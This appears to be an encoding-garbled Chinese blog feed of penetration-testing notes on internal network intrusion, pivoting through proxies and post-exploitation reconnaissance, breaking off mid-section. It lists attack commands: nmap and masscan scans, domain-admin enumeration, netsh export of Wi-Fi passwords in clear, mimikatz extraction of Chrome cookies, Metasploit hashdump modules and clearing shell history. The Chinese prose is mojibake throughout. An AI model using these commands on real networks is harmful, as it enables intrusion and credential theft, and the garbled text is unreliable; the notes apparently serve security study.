      <url>/2022/01/03/msf-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="msfç¬”è®°"><a href="#msfç¬”è®°" class="headerlink" title="msfç¬”è®°"></a>msfç¬”è®°</h1><p>å…ˆNmapæˆ–è€…arp-scanæ‰«ç«¯å£ï¼Œæ ¹æ®ç«¯å£æ”»å‡»ã€‚å¦‚æœå¼€äº†webç«¯å£ï¼Œå°±æƒ³åŠæ³•rceåå¼¹shellã€‚æ‹¿åˆ°shellåæ‰«ä¸€ä¸‹å†…ç½‘ï¼Œç›®å‰åªä¼špingæ‰«ï¼Œæˆ–è€…å‡msfï¼Œç”¨msfçš„scan expæ‰«ã€‚ç„¶ååœ¨é¶æœºä¸Šdownload venomå®¢æˆ·ç«¯ç”¨ä»¥ä»£ç†ï¼Œåœ¨æ”»å‡»æœºèµ·æœåŠ¡ç«¯ï¼Œsocksé€šé“æ‰“é€šåï¼Œæ›´æ”¹proxychains4.confï¼ˆé…ç½®æ–‡ä»¶ï¼Œåå­—å¯èƒ½ä¸ä¸€æ ·ï¼‰ï¼Œå®ç°æ”»å‡»æœºçš„å…¨å±€ä»£ç†ï¼Œç„¶åå¸¦ä¸ŠProxychains nmapæ‰«å†…ç½‘é¶æœºç«¯å£</p><blockquote><p>å¦‚æœé¶æœºæ‰“ç€æ— å›æ˜¾äº†ï¼Œåº”è¯¥æ˜¯é¶æœºå‘½ä»¤è¿˜æ²¡æ‰§è¡Œå®Œï¼Œæ¯”å¦‚pingæ‰«å†…ç½‘ï¼Œå‘½ä»¤è¿˜æ²¡æ‰§è¡Œå®Œï¼Œåœ¨shellé€€äº†sessionsï¼Œæˆ–è€…å•çº¯çš„ç”¨ctrl+cï¼Œåœ¨é¶æœºä¸Šå‘½ä»¤æ˜¯è¿˜ä¼šç»§ç»­æ‰§è¡Œçš„ï¼Œå°±å¯¼è‡´äº†åç»­å‘½ä»¤æ‰§è¡Œä¸äº†ã€‚è¿™ç§æƒ…å†µå†æ€æ‰sessioné‡æ–°æ‰“æ—¶ï¼Œä¹‹å‰åœ¨é¶æœºä¸Šçš„shellè¿˜åœ¨ï¼Œå°±ä¼šå‘ç”Ÿå¦‚ä¸‹æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Command shell session 3 is not valid and will be closed</span><br><span class="line">[*] 192.168.137.129 - Command shell session 3 closed.</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠé¶æœºé‡å¯ï¼Œä½†æ˜¯è¦é‡å¤è®¸å¤šæ­¥éª¤ï¼Œæœ€å¥½ä¸è¦æ€æ‰sessions,è¿›å…¥ä¹‹å‰æ²¡æ‰§è¡Œå®Œå‘½ä»¤çš„sessionsï¼Œç„¶åå‘é€è¿œç¨‹ctrl+c</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> å†…ç½‘ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡è¾¹ç•Œä»£ç†ä¸€è·¯æ‰“åˆ°ä¸‰å±‚å†…ç½‘+åæ¸—é€é€šç”¨æ‰‹æ³•</title>
      <link href="/2021/12/10/tong-guo-bian-jie-dai-li-yi-lu-da-dao-san-ceng-nei-wang-hou-shen-tou-tong-yong-shou-fa/"/>
      <url>/2021/12/10/tong-guo-bian-jie-dai-li-yi-lu-da-dao-san-ceng-nei-wang-hou-shen-tou-tong-yong-shou-fa/</url>
      
        <content type="html"><![CDATA[<p>å¤–ç½‘è¿›å†…ç½‘é€šå¸¸å°±æ˜¯é€šè¿‡webæ¼æ´æ‹¿å–shell</p><p>å†…ç½‘çš„å¾ˆå¤§ä¸€éƒ¨åˆ†ä¿¡æ¯æ”¶é›†æ˜¯å›´ç»•ç½‘ç»œæ‹“æ‰‘å›¾å±•å¼€çš„ã€‚å¯ä»¥ç¤¾å·¥è¿ç»´æˆ–è€…googleæ‰¾ä¸€ä¸‹ã€‚</p><h1 id="å†…ç½‘æ‰©æ•£ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘æ‰©æ•£ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘æ‰©æ•£ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘æ‰©æ•£ä¿¡æ¯æ”¶é›†</h1><p>æ¦‚è¿°</p><ul><li>å†…ç½‘ä¿¡æ¯æ”¶é›† <ul><li>å†…ç½‘ç½‘ç«¯ä¿¡æ¯ï¼šå¯¹å†…ç½‘è¿›è¡Œæ‹“æ‰‘ã€åˆ†åŒº</li><li>å†…ç½‘å¤§å°</li></ul></li><li>å†…ç½‘æ ¸å¿ƒä¸šåŠ¡ä¿¡æ¯<ul><li>oaç³»ç»Ÿã€é‚®ä»¶æœåŠ¡å™¨ã€ç›‘æ§ç³»ç»Ÿâ€¦.</li></ul></li><li>å…¶ä»–<ul><li>Windowsã€linuxä¸»æœºä¿¡æ¯æ”¶é›†</li></ul></li></ul><p>å†…ç½‘ä¿¡æ¯æ”¶é›†åšçš„è¶Šå¥½ï¼Œæ‰“çš„è¶Šå¿«</p><ul><li>å¸¸ç”¨æ–¹æ³•<ol><li>ä¸»åŠ¨æ‰«æã€‚å¸¸ç”¨å·¥å…·: nmap,netdiscover,nc,masscan,è‡ªå†™è„šæœ¬ç­‰</li><li>å¸¸ç”¨ç«¯å£å’ŒæœåŠ¡æ¢æµ‹</li><li>å†…ç½‘æ‹“æ‰‘æ¶æ„åˆ†æã€‚å¦‚dmz,æµ‹è¯•ç½‘ç­‰</li><li>å‘½ä»¤æ”¶é›†</li><li>æœ¬æœºä¿¡æ¯</li></ol></li></ul><blockquote><p>nmapçš„æµé‡å¾ˆå¤§ã€‚å› ä¸ºnmapç”¨äº†å¾ˆå¤šæ–¹å¼è¿›è¡Œæ‰«æï¼Œå‡†ç¡®ç‡é«˜çš„åŒæ—¶æµé‡è¾ƒå¤§ï¼Œå¤–ç½‘å¯ä»¥ç”¨<br>ä¸»åŠ¨æ‰«æç•™ä¸‹çš„ç—•è¿¹å¾ˆå¤šä¸”è¾ƒéš¾æ¸…æ¥šã€‚è¢«åŠ¨æ‰«æéœ€è¦çš„æ—¶é—´è¾ƒé•¿ã€‚è§†æƒ…å†µæ‰«æ</p></blockquote><p>ä¸€èˆ¬éƒ½æ˜¯å…ˆæ‰«80ç«¯å£ç­‰ã€‚å› ä¸ºå¤–ç½‘ç½‘ç«™å¯èƒ½åšçš„å¾ˆå¥½ï¼Œå†…ç½‘ç½‘ç«™çƒ‚çš„çˆ†ï¼Œsqlæ³¨å…¥ã€xssç­‰webæ¼æ´ä¸€æŠŠä¸€æŠŠçš„ã€‚</p><h3 id="ä¸»åŠ¨æ‰«æ"><a href="#ä¸»åŠ¨æ‰«æ" class="headerlink" title="ä¸»åŠ¨æ‰«æ"></a>ä¸»åŠ¨æ‰«æ</h3><ol><li>pingå‘½ä»¤æ‰«æå†…ç½‘ä¸­çš„å­˜æ´»ä¸»æœº<ul><li>ä¼˜ç‚¹:æ–¹ä¾¿ï¼Œä¸€èˆ¬ä¸ä¼šå¼•èµ·æµé‡æ£€æµ‹è®¾å¤‡çš„æŠ¥è­¦</li><li>ç¼ºç‚¹ï¼šæ‰«æé€Ÿåº¦æ…¢ï¼Œç›®æ ‡å¼€äº†é˜²ç«å¢™ä¼šå¯¼è‡´ç»“æœä¸å‡†</li></ul></li><li>nmapæ‰«æå­˜æ´»ä¸»æœº(icmpæ‰«æ)<ul><li><code>nmap -sn -PE -n -v -oN 1.txt ç›®æ ‡ip</code></li><li></li><li>å‚æ•°ï¼š -sn ä¸è¿›è¡Œç«¯å£æ‰«æ;-PE è¿›è¡Œicmp echoæ‰«æ;-n ä¸è¿›è¡Œåå‘è§£æ;-v è¾“å‡ºè°ƒè¯•ä¿¡æ¯;-oNè¾“å‡º</li></ul></li><li><strong>nmap æ‰«æå­˜æ´»ä¸»æœº(arpæ‰«æ)</strong><ul><li><code>nmap -sn -PR -n -v ç›®æ ‡IP</code></li><li>å‚æ•°ï¼š-PRä»£è¡¨arpæ‰«æï¼Œåœ¨å†…ç½‘ä¸­arpæ‰«æé€Ÿåº¦æœ€å¿«ä¸”å‡†ç¡®ç‡é«˜</li></ul></li><li>ä½¿ç”¨netdiscoveræ‰«æ(arpæ‰«æå·¥å…·ï¼Œæ—¢å¯ä»¥ä¸»åŠ¨æ‰«æä¹Ÿå¯ä»¥è¢«åŠ¨å—…æ¢)<ul><li><code>netdiscover -i eth0 -r ç›®æ ‡IP</code></li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li>å‚æ•°è¯´æ˜:-i:æŒ‡å®šä¸€ä¸ªæ¥å£;-râˆ¶æŒ‡å®šæ‰«æèŒƒå›´<ul><li>æ³¨æ„: netdiscoveræ—¶é—´è¶Šä¹…è¶Šç²¾ç¡®ï¼Œå¯ä»¥å‘ç°æŸä¸€å°ä¸»æœºåœ¨ä¸€æ®µæ—¶é—´å†…ä»‹å…¥äº†é‚£äº›ç½‘æ®µï¼Œä»è€Œå‘ç°å…¶ä»–æ–°çš„ç½‘æ®µåœ°å€</li></ul></li></ul></li><li>ç”¨nbtscanå·¥å…·è¿›è¡Œå¿«é€Ÿæ‰«æå­˜æ´»PCç«¯ï¼ŒåŒæ—¶è·å¾—NETBIOS(windowså¾€ä¸Šè¾“å…¥è¾“å‡ºæœåŠ¡,139ç«¯å£)<ul><li><code>nbtscan -r ç›®æ ‡IP</code></li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul></li></ol><h3 id="ç«¯å£å’ŒæœåŠ¡æ‰«æ"><a href="#ç«¯å£å’ŒæœåŠ¡æ‰«æ" class="headerlink" title="ç«¯å£å’ŒæœåŠ¡æ‰«æ"></a>ç«¯å£å’ŒæœåŠ¡æ‰«æ</h3><ol><li><p>æ¢æµ‹ç›®æ ‡å¼€æ”¾ç«¯å£</p><ul><li>nmapæ¢æµ‹ï¼š<code>nmap -Pn -n ç›®æ ‡IP</code>ï¼ˆç¦pingæ‰«æ)</li><li>masscanæ‰«æï¼š<code>masscan -p ç«¯å£å· ç›®æ ‡IPåœ°å€ --rate=10000</code> #ç”¨10kppsé€Ÿåº¦æ‰«æç«¯å£</li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul></li><li><p>æ¢æµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿ</p><ul><li><p>ä½¿ç”¨NSEè„šæœ¬: <code>nmap --script smb-os-discovery.nse -p 445 ç›®æ ‡IPåœ°å€</code></p><ul><li>å…¶ä¸­: smb-os-discovery.nseè„šæœ¬é€šè¿‡smbæ¥æ¢æµ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€è®¡ç®—æœºåã€å·¥ä½œç»„åã€åŸŸåç­‰ç­‰ä¿¡æ¯ã€‚â€“scriptæŒ‡å®šè„šæœ¬</li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul></li><li><p>ä½¿ç”¨nmap -Oæ¢æµ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬<br><code>nmap -O ç›®æ ‡IP</code></p></li></ul></li><li><p>æ‰«æä¸»æœºå­˜åœ¨çš„CVEæ¼æ´</p><ul><li><code>nmap --script=vuln ç›®æ ‡IP</code></li></ul></li></ol><h3 id="å†…ç½‘å¸¸ç”¨å‘½ä»¤"><a href="#å†…ç½‘å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å†…ç½‘å¸¸ç”¨å‘½ä»¤"></a>å†…ç½‘å¸¸ç”¨å‘½ä»¤</h3><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>net user</td><td>æœ¬æœºç”¨æˆ·åˆ—è¡¨</td></tr><tr><td>net view</td><td>æŸ¥è¯¢åŒä¸€åŸŸå†…çš„æœºå™¨åˆ—è¡¨</td></tr><tr><td>net localgroup administrators</td><td>æŸ¥çœ‹æœ¬æœºç®¡ç†å‘˜</td></tr><tr><td>net user &#x2F;domain</td><td>æŸ¥è¯¢åŸŸç”¨æˆ·</td></tr><tr><td>net group &#x2F;domain</td><td>æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„</td></tr><tr><td>net group â€œdomain adminsâ€&#x2F;domain</td><td>æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</td></tr><tr><td>net localgroup administrators &#x2F;domain</td><td>ç™»é™†æœ¬æœºçš„åŸŸç®¡ç†å‘˜</td></tr><tr><td>net localgroup administrators workgroup \user &#x2F;add</td><td>åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</td></tr><tr><td>net group â€œDomain controllersâ€</td><td>æŸ¥çœ‹åŸŸæ§</td></tr><tr><td>&#x2F;domainä¸ºåŸŸæ¸—é€å‚æ•°ã€‚åŸŸç®¡ç†æœ‰ä¸€å°æƒé™å¾ˆé«˜çš„æœºå™¨ï¼Œæ‹¿ä¸‹ä¹‹åèƒ½æ§åˆ¶æ•´ä¸ªåŸŸçš„æœåŠ¡å™¨ï¼Œç§°ä¸ºåŸŸæ§ã€‚</td><td></td></tr></tbody></table><ul><li>dsquery åŸŸå‘½ä»¤(åé¢å†å†™åŸŸæ¸—é€)</li></ul><table><thead><tr><th>å‘½ä»¤</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>dsquery computer domainroot -limit 65535 &amp;&amp; net group â€œdomain computersâ€&#x2F;domain</td><td>åˆ—å‡ºåŸŸä¸­å†…æ‰€æœ‰æœºå™¨å</td></tr><tr><td>dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain</td><td>åˆ—å‡ºè¯¥åŸŸå†…æ‰€æœ‰ç”¨æˆ·å</td></tr><tr><td>dsquery subnet</td><td>åˆ—å‡ºè¯¥åŸŸå†…ç½‘æ®µåˆ’åˆ†</td></tr><tr><td>dsquery group &amp;&amp; net group &#x2F;domain</td><td>åˆ—å‡ºè¯¥åŸŸå†…åˆ†ç»„</td></tr><tr><td>dsquery ou</td><td>åˆ—å‡ºè¯¥åŸŸå†…ç»„ç»‡å•ä½</td></tr><tr><td>dsquery server &amp;&amp; net time &#x2F;domain</td><td>åˆ—å‡ºè¯¥åŸŸå†…æ§åˆ¶å™¨</td></tr></tbody></table><h2 id="windowsä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#windowsä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="windowsä¸»æœºä¿¡æ¯æ”¶é›†"></a>windowsä¸»æœºä¿¡æ¯æ”¶é›†</h2><p>è¿™é‡Œæ˜¯åœ¨æ‹¿ä¸‹æœ€é«˜æƒé™ä¹‹åçš„ä¿¡æ¯æ”¶é›†ã€‚</p><ul><li>ä¸»è¦æ”¶é›†å†…å®¹</li></ul><blockquote><ol><li>ç³»ç»Ÿç®¡ç†å‘˜å¯†ç (hash-&gt;æ˜æ–‡)</li><li>å…¶ä»–ç”¨æˆ·çš„sessionï¼Œ3389ï¼Œipcè¿æ¥è®°å½•ä»¥åŠå„ç”¨æˆ·å›æ”¶ç«™ä¿¡æ¯æ”¶é›†</li><li>æµè§ˆå™¨å¯†ç å’Œcookiesçš„è·å–</li><li>windowsæ— çº¿å¯†ç è·å–</li><li>æ•°æ®åº“å¯†ç è·å–</li><li>hostæ–‡ä»¶ï¼Œdnsç¼“å­˜ä¿¡æ¯</li><li>æ€æ¯’è½¯ä»¶ï¼Œè¡¥ä¸ï¼Œè¿›ç¨‹ï¼Œç½‘ç»œä»£ç†ä¿¡æ¯</li><li>å…±äº«æ–‡ä»¶å¤¹ï¼ŒwebæœåŠ¡å™¨é…ç½®æ–‡ä»¶ç­‰</li><li>è®¡åˆ’ä»»åŠ¡ï¼Œè´¦å·å¯†ç ç­–ç•¥ï¼Œé”å®šç­–ç•¥</li></ol></blockquote><h3 id="windowsæ‚ä¸ƒæ‚å…«çš„ä¿¡æ¯æ”¶é›†"><a href="#windowsæ‚ä¸ƒæ‚å…«çš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="windowsæ‚ä¸ƒæ‚å…«çš„ä¿¡æ¯æ”¶é›†"></a>windowsæ‚ä¸ƒæ‚å…«çš„ä¿¡æ¯æ”¶é›†</h3><ul><li>å·¥å…·ï¼šmimikatzã€wceã€getpassã€quarkspwdumpã€reg-samã€pwdump7ç­‰</li></ul><ol><li><p>cmdkeyç”¨äºä¿å­˜ç”¨æˆ·åå’Œå¯†ç çš„å‡­è¯ã€‚</p><ul><li><code>cmdkey /list</code>æŸ¥çœ‹å‡­æ®ä½ç½®</li><li>netpass.exeè·å–å¯†ç </li></ul></li><li><p>å›æ”¶ç«™ä¿¡æ¯è·å–</p><ul><li>è¿›å…¥å›æ”¶ç«™æ–‡ä»¶å¤¹<code>cd C:$RECYCLE.BIN</code>ï¼ˆè¯¥æ–‡ä»¶å¤¹ä¸ºéšè—æ–‡ä»¶å¤¹ï¼Œdir &#x2F;ahæŸ¥çœ‹å†…å®¹ï¼ŒaæŒ‡å®šå±æ€§hè¡¨ç¤ºéšè—)</li></ul></li><li><p>è·å–æ— çº¿å¯†ç </p><ul><li><code>netsh wlan export profile interface=WLAN key=clear folder=C:\</code></li></ul></li><li><p>è·å–æµè§ˆå™¨çš„cookieå’Œå­˜å‚¨å¯†ç (chrome)</p><ul><li><code>%localappdata%\google\chrome\USERDATA\default\cookies%localappdata%\googlelchrome\USERDATA\default\Login</code></li><li>Datachromeçš„ç”¨æˆ·ä¿¡æ¯ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ä¸ºsqliteæ•°æ®åº“æ ¼å¼</li><li>ä½¿ç”¨mimikatzè¯»å–å†…å®¹:<br><code>mimikatz.exe privilege:debug log &quot;dpapi:chrome /in:%localappdata%google\chrome\USERDATA\default\cookies /unprotect&quot;</code></li></ul></li></ol><h3 id="msfä¸‹çš„windowsä¿¡æ¯æ”¶é›†"><a href="#msfä¸‹çš„windowsä¿¡æ¯æ”¶é›†" class="headerlink" title="msfä¸‹çš„windowsä¿¡æ¯æ”¶é›†"></a>msfä¸‹çš„windowsä¿¡æ¯æ”¶é›†</h3><table><thead><tr><th>æ¨¡å—</th><th>ä½¿ç”¨</th></tr></thead><tbody><tr><td>post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives</td><td>è·å–ç›®æ ‡ä¸»æœºçš„ç£ç›˜åˆ†åŒºæƒ…å†µ</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;checkvm</td><td>åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦ä¸ºè™šæ‹Ÿæœº</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_services</td><td>æŸ¥çœ‹å¼€å¯çš„æœåŠ¡</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_applications</td><td>æŸ¥çœ‹å®‰è£…çš„åº”ç”¨</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_shares</td><td>æŸ¥çœ‹å…±äº«</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;dumplinks</td><td>æŸ¥çœ‹ç›®æ ‡ä¸»æœºæœ€è¿‘çš„æ“ä½œ</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_patches</td><td>æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</td></tr><tr><td>scraper</td><td>å¯¼å‡ºå¤šä¸ªä¿¡æ¯</td></tr><tr><td>use or runæ¨¡å—ï¼Œè®¾ç½®å‚æ•°åexpoilt</td><td></td></tr></tbody></table><h2 id="linuxä¿¡æ¯æ”¶é›†"><a href="#linuxä¿¡æ¯æ”¶é›†" class="headerlink" title="linuxä¿¡æ¯æ”¶é›†"></a>linuxä¿¡æ¯æ”¶é›†</h2><p>linuxä¿¡æ¯æ”¶é›†å†…å®¹æ¯”èµ·windowså°‘å¾ˆå¤š</p><ul><li><p><strong>historyå‘½ä»¤</strong></p><ul><li>ç”¨äºæ˜¾ç¤º<strong>å†å²æ‰§è¡Œå‘½ä»¤</strong>ã€‚èƒ½æ˜¾ç¤ºå½“å‰ç”¨æˆ·åœ¨æœ¬åœ°è®¡ç®—æœºä¸­æ‰§è¡Œçš„1000æ¡å‘½ä»¤ã€‚æŸ¥çœ‹æ›´å¤šåœ¨&#x2F;etc&#x2F;profileæ–‡ä»¶ä¸­è‡ªå®šä¹‰HISTSIZEçš„å˜é‡å€¼ã€‚</li><li>ä½¿ç”¨history -cå‘½ä»¤ä¼šæ¸…ç©ºæ‰€æœ‰å‘½ä»¤çš„å†å²è®°å½•ã€‚</li><li>æ¯ä¸ªç”¨æˆ·çš„historyä¸åŒ</li></ul></li><li><p><strong>lastå‘½ä»¤</strong></p><ul><li>ç”¨äºæŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰è¿‘æœŸç™»å½•è®°å½•ã€‚</li><li>æ‰§è¡Œlastå‘½ä»¤æ—¶ï¼Œä¼šè¯»å–&#x2F;var&#x2F;log&#x2F;wtmpçš„æ–‡ä»¶ã€‚<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li>ç”¨æˆ·å ç»ˆç«¯ä½ç½® ç™»å½•IPæˆ–è€…å†…æ ¸ å¼€å§‹æ—¶é—´ ç»“æŸæ—¶é—´</li><li>å¦‚æœæ˜¯ç³»ç»Ÿæ¼æ´ææƒï¼Œä¸å±äºç™»å½•ï¼Œæ— è®°å½•</li></ul></li><li><p><strong>arp -vn</strong></p><ul><li>èšç±»æ£€æŸ¥æ˜¯å¦æœ‰<strong>è¶…åŒç»„ä¸šåŠ¡å¤–</strong>çš„arpåœ°å€</li><li>macåœ°å€å¯¹åº”ipå›ºå®šï¼Œmacä¸å¯¹åº”ipåˆ™ä¸ºarpæ¬ºéª—</li></ul></li><li><p>&#x2F;etc&#x2F;hostsæ–‡ä»¶</p><ul><li>å­˜å‚¨åŸŸå&#x2F;ä¸»æœºååˆ°ipæ˜ å°„å…³ç³»</li></ul></li></ul><h3 id="msfä¸‹çš„linuxæ”¶é›†"><a href="#msfä¸‹çš„linuxæ”¶é›†" class="headerlink" title="msfä¸‹çš„linuxæ”¶é›†"></a>msfä¸‹çš„linuxæ”¶é›†</h3><table><thead><tr><th>æ¨¡å—</th><th>ä½¿ç”¨</th></tr></thead><tbody><tr><td>post&#x2F;linux&#x2F;gather&#x2F;checkvm</td><td>åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦ä¸ºè™šæ‹Ÿæœº</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_configs</td><td>æŸ¥çœ‹é…ç½®ä¿¡æ¯</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_network</td><td>æŸ¥çœ‹ç½‘ç»œ</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_protections</td><td>æŸ¥çœ‹å…±äº«</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_system</td><td>æŸ¥çœ‹ç³»ç»Ÿå’Œç”¨æˆ·ä¿¡æ¯</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_users_histroy</td><td>æŸ¥çœ‹ç›®æ ‡ä¸»æœºæœ€è¿‘çš„æ“ä½œ</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;hashdump</td><td>è·å–linuxçš„hash</td></tr></tbody></table><p>ä½†æ˜¯æˆ‘ä»è¦å¼ºè°ƒï¼Œè¢«åŠ¨æ”¶é›†å¾ˆé‡è¦ï¼Œå†…ç½‘è¢«åŠ¨æ”¶é›†è¦å®‰å…¨å¾ˆå¤šï¼Œä½†æ˜¯å‘¨æœŸå¾ˆé•¿ã€‚ä¸»åŠ¨ä¸€åˆ†ï¼Œå°±å±é™©ä¸€åˆ†</p><h2 id="æ”¶é›†å†…å®¹æ€»ç»“"><a href="#æ”¶é›†å†…å®¹æ€»ç»“" class="headerlink" title="æ”¶é›†å†…å®¹æ€»ç»“"></a>æ”¶é›†å†…å®¹æ€»ç»“</h2><p>ç½‘å¡ä¿¡æ¯ã€arpç¼“å­˜ã€è·¯ç”±ç¼“å­˜ã€ç½‘ç«™é…ç½®æ–‡ä»¶ã€æ•°æ®åº“ã€è®¿é—®æ—¥å¿—ã€æµè§ˆå™¨å†å²è®°å½•ã€netstatã€hostsæ–‡ä»¶ã€historyã€hashã€æ˜æ–‡å¯†ç ã€ç½‘ç«™é…ç½®è´¦å¯†ã€wifiã€cmdkey</p><h1 id="å†…ç½‘è½¬å‘"><a href="#å†…ç½‘è½¬å‘" class="headerlink" title="å†…ç½‘è½¬å‘"></a>å†…ç½‘è½¬å‘</h1><ul><li>å†…ç½‘è½¬å‘çš„ç›®çš„</li></ul><blockquote><p>ç†è®ºä¸Šé€šè¿‡ç½‘ç»œè¿æ¥çš„è®¡ç®—æœºéƒ½æ˜¯å¯ä»¥äº’ç›¸è®¿é—®çš„ï¼Œä½†æ˜¯å› ä¸ºæŠ€æœ¯åŸå› æ²¡æœ‰å®ç°ã€‚å¦‚å±€åŸŸç½‘ä¸­æŸè®¡ç®—æœºä»…å¼€æ”¾webæœåŠ¡ï¼Œåˆ™åªèƒ½å†…ç½‘ä½¿ç”¨ï¼Œå¤–ç½‘æ— æ³•ç›´æ¥è®¿é—®ã€‚è¦è®©å¤–ç½‘ç”¨æˆ·ç›´æ¥è®¿é—®å±€åŸŸç½‘æœåŠ¡ï¼Œå¿…é¡»è¿›è¡Œå†…ç½‘è½¬å‘ç­‰æ“ä½œ<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><ul><li><p>å†…ç½‘è½¬å‘åŸç†<br>é€šè¿‡æœåŠ¡å™¨è¿›è¡Œä¸­è½¬ï¼Œå°†å†…éƒ¨çš„<strong>ç«¯å£æ˜ å°„åˆ°å…¬ç½‘IP</strong>ä¸Šï¼Œæˆ–è€…å°†å†…ç½‘ç«¯å£<strong>è½¬å‘è‡³å¤–éƒ¨æœåŠ¡å™¨</strong>ã€‚</p></li><li><p>å†…ç½‘è½¬å‘çš„ä¸‰ç§å½¢å¼</p></li></ul><blockquote><ol><li>ç«¯å£è½¬å‘</li></ol><blockquote><p>ç”¨äºç›®æ ‡æœºå™¨å¯¹æŸä¸€ç«¯å£çš„è®¿é—®è¿›è¡Œäº†é™åˆ¶ã€‚å¯ä»¥å°†æœ¬æœºçš„ç«¯å£æˆ–è€…æ˜¯æœ¬æœºå¯ä»¥è®¿é—®åˆ°çš„ä»»æ„ä¸»æœºçš„ç«¯å£è½¬å‘åˆ°ä»»æ„ä¸€å°ä½ éœ€è¦è®¿é—®çš„å…¬ç½‘IPä¸Š</p></blockquote><ol start="2"><li>ç«¯å£æ˜ å°„</li></ol><blockquote><p>å°†ä¸€ä¸ªå†…ç½‘æ— æ³•è®¿é—®çš„ç«¯å£æ˜ å°„åˆ°å…¬ç½‘çš„æŸä¸ªç«¯å£ï¼Œè¿›è€Œè¿›è¡Œæ”»å‡»ã€‚æ¯”å¦‚:3389ç«¯å£</p></blockquote><ol start="3"><li>ä»£ç†è½¬å‘</li></ol><blockquote><p>ä¸»è¦ç”¨äºåœ¨ç›®æ 